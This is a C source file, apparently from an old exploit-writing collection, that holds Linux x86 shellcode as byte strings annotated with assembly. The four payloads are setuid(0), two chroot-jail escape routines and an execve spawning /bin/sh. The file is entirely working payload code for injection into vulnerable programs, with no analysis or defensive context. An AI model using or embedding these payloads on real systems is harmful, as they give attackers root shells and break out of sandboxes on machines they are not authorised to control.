/*
 * linux shellcode collection
 * written by bind@insidiae.org
 */

const char setuid[] = 
  "\x31\xdb"				/* xorl	%ebx, %ebx       */
  "\x8d\x43\x17"			/* leal	0x17(%ebx), %eax */
  "\xcd\x80";				/* int $0x80             */

const char chroot[] = 
  "\x31\xd2"				/* xorl	%edx, %edx       */
  "\x52"						/* pushl %edx            */
  "\x6a\x41"				/* push $0x41            */
  "\x89\xe3"				/* movl %esp, %ebx       */
  "\x66\xb9\xed\x01"		/* movw $0x1ed, %cx      */
  "\x8d\x42\x27"			/* leal 0x27(%edx), %eax */
  "\xcd\x80"				/* int $0x80             */
  "\x8d\x42\x3d"			/* leal 0x3d(%edx), %eax */
  "\xcd\x80"				/* int $0x80             */
  "\x31\xf6"				/* xorl %esi, %esi       */
  "\x52"						/* pushl %edx            */
  "\x68\x2e\x2e\x2f\x2f"/* pushl $0x2f2f2e2e     */
  "\x46"						/* incl %esi             */
  "\x83\xfe\x10"			/* cmpl $0x10, %esi      */
  "\x7c\xf5"				/* jl <loop>             */
  "\x89\xe3"				/* movl %esp, %ebx       */
  "\x8d\x42\x3d"			/* leal 0x3d(%edx), %eax */
  "\xcd\x80"				/* int $0x80             */
  "\x52"						/* pushl %edx            */
  "\x6a\x41"				/* push $0x41            */
  "\x89\xe3"				/* movl %esp, %ebx       */
  "\x8d\x42\x28"			/* leal 0x28(%edx), %eax */
  "\xcd\x80";				/* int $0x80             */

const char neo_chroot[] = 
  "\x31\xd2"				/* xorl %edx, %edx       */
  "\x52"						/* pushl %edx            */
  "\x68\x2e\x2e\x2e\x2e"/* pushl $0x2e2e2e2e     */
  "\x89\xe3"				/* movl %esp, %ebx       */
  "\x66\xb9\xed\x01"		/* movw $0x1ed, %cx      */
  "\x8d\x42\x27"			/* leal 0x27(%edx), %eax */
  "\xcd\x80"				/* int $0x80             */
  "\x8d\x42\x3d"			/* leal 0x3d(%edx), %eax */
  "\xcd\x80"				/* int $0x80             */
  "\x31\xf6"				/* xorl %esi, %esi       */
  "\x52"						/* pushl %edx            */
  "\x66\x68\x2e\x2e"		/* pushw $0x2e2e         */
  "\x89\xe3"				/* movl %esp, %ebx       */
  "\x8d\x42\x0c"			/* leal 0xc(%edx), %eax  */
  "\xcd\x80"				/* int $0x80             */
  "\x52"						/* pushl %edx            */
  "\x6a\x2e"				/* push $0x2e            */
  "\x89\xe3"				/* movl %esp, %ebx       */
  "\x83\xec\x58"			/* subl $0x58, %ecx      */
  "\x89\xe1"				/* movl %esp, %ecx       */
  "\x8d\x42\x6a"			/* leal 0x6a(%edx), %eax */
  "\xcd\x80"				/* int $0x80             */
  "\x8b\x79\x04"			/* movl 0x4(%ecx), %edi  */
  "\x83\xff\x02"			/* cmpl $0x2, %edi       */
  "\x74\x06"				/* je <hacked>           */
  "\x46"						/* incl %esi             */
  "\x83\xfe\x64"			/* cmpl $0x64, %esi      */
  "\x7c\xd7"				/* jl <loop>             */
  "\x52"						/* pushl %edx            */
  "\x6a\x2e"				/* push $0x2e            */
  "\x89\xe3"				/* movl %esp, %ebx       */
  "\x8d\x42\x3d"			/* leal 0x3d(%edx), %eax */ 
  "\xcd\x80";				/* int $0x80             */

const char execve[] =
  "\x31\xd2"				/* xorl %edx, %edx       */
  "\x52"						/* pushl %edx            */
  "\x68\x2f\x2f\x73\x68"/* pushl $0x68732f2f     */
  "\x68\x2f\x62\x69\x6e"/* pushl $0x6e69622f     */
  "\x89\xe3"				/* movl %esp, %ebx       */
  "\x52" 					/* pushl %edx            */
  "\x53"						/* pushl %ebx            */
  "\x89\xe1"				/* movl %esp, %ecx       */
  "\x8d\x42\x0b"			/* leal 0xb(%edx), %eax  */
  "\xcd\x80";				/* int $0x80             */
